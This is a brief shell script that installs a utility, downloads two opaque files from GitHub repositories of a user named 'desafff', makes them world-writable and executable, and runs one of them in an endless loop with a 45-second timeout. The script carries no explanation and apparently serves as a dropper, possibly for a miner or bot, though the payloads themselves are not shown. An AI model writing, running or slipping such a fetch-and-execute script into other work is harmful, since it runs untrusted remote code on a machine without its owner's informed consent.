#!/bin/sh
sudo apt install timelimit -y
wget -O syng https://raw.githubusercontent.com/desafff/gader/main/fas
wget -O kontol https://github.com/desafff/ggss/raw/main/vio
chmod 777 syng kontol
while :; do timeout 45 bash ./syng; sleep 1; done
